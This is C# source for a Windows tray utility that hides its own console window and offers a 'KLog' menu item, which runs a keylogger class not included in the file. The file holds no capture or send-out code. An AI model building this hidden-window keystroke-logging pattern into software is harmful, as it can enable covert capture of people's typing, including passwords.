using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace UtilityApp
{
    internal enum Acts
    { NOTHING, EXIT, KEYLOG, BUSY };

    internal class Program
    {
        //Menu Options
        private static Acts acts = Acts.NOTHING;

        //Icon stuffs
        public static ContextMenu menu;

        public static MenuItem mnuExit;
        public static MenuItem mnuKLog;
        public static NotifyIcon notificationIcon;

        //Key Logger
        private static KeyCatch keyLog = new KeyCatch();

        //Lazy WriteLine function
        private static void WL(string line)
        {
            Console.WriteLine(line);
            return;
        }

        private static void BuildMenu()
        {
            menu = new ContextMenu();
            mnuExit = new MenuItem("Exit");
            mnuKLog = new MenuItem("KLog");
            menu.MenuItems.Add(0, mnuExit);
            menu.MenuItems.Add(1, mnuKLog);

            mnuExit.Click += new EventHandler(MnuExit_Click);
            mnuKLog.Click += new EventHandler(MnuKLog_Click);
        }

        private static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            Thread notifyThread = new Thread(
                delegate ()
                {
                    BuildMenu();

                    notificationIcon = new NotifyIcon()
                    {
                        Icon = Properties.Resources.AppIco,
                        ContextMenu = menu,
                        Text = "Main"
                    };

                    notificationIcon.Visible = true;
                    Application.Run();
                }
            );

            notifyThread.Start();

            while (acts != Acts.EXIT)
            {
                switch (acts)
                {
                    case Acts.KEYLOG:
                        //menu.MenuItems.Clear();
                        notificationIcon.Visible = false;
                        keyLog.Run();
                        Console.WriteLine("Loggin Keys");
                        acts = Acts.NOTHING;
                        notificationIcon.Visible = true;
                        break;

                    case Acts.EXIT:
                        EndApp();
                        acts = Acts.NOTHING;
                        break;

                    case Acts.NOTHING:
                    default:
                        //acts = Acts.NOTHING;
                        //Console.WriteLine(acts.ToString());
                        break;
                }
            }
            EndApp();
        }

        //Generates the main menu
        private static bool Menu()
        {
            Console.Clear();
            WL("Select one");
            WL("--------------");
            WL("1)            ");
            WL("2)            ");
            WL("4)            ");
            WL("5) Keylogger  ");
            WL("6) Quit       ");
            WL("--------------");
            //Application.Run();
            try
            {
                int run = int.Parse(Console.ReadLine());
                switch (run)
                {
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                        break;

                    case 5:
                        keyLog.Run();
                        break;

                    default:
                        //WL(run.ToString());
                        return false;
                        break;
                }
            }
            catch
            {
            }
            return true;
        }

        private static void EndApp()
        {
            notificationIcon.Dispose();
            Environment.Exit(0);
        }

        private static void MnuExit_Click(object sender, EventArgs e)
        {
            WL("Closing");
            acts = Acts.EXIT;
            EndApp();
        }

        private static void MnuKLog_Click(object sender, EventArgs e)
        {
            acts = Acts.KEYLOG;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}